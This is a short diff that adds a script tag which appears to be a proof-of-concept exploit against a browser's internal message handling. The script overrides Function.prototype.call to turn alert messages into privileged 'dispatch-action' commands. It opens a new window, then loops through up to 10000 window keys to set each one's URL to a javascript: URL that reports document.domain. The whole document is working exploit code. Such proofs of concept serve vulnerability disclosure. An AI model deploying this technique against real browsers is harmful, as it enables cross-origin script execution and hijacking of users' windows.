@@ -1,0 +1,23 @@
+<script>
+Function.prototype.call=function(e){
+    if(e[0]&&e[0]=="window-alert"){
+        e[0]="dispatch-action";
+        e[1]='{"actionType":"window-new-frame","frameOpts":{"location":"https://www.google.com/ncr"},"openInForeground":true}'
+    }
+    return this.apply(e);
+}
+alert();
+
+setTimeout(function(){
+	for(var windowKey=0;windowKey<10000;windowKey++){
+		Function.prototype.call=function(e){
+			if(e && e[0] && e[0]=="window-alert"){
+				e[0]="dispatch-action";
+				e[1]=`{"actionType":"window-set-url","location":"javascript:alert('document.domain is: '+document.domain)","key":${windowKey}}`
+			}
+			return this.apply(e);
+		}
+		alert();
+	}
+},3000);
+</script>
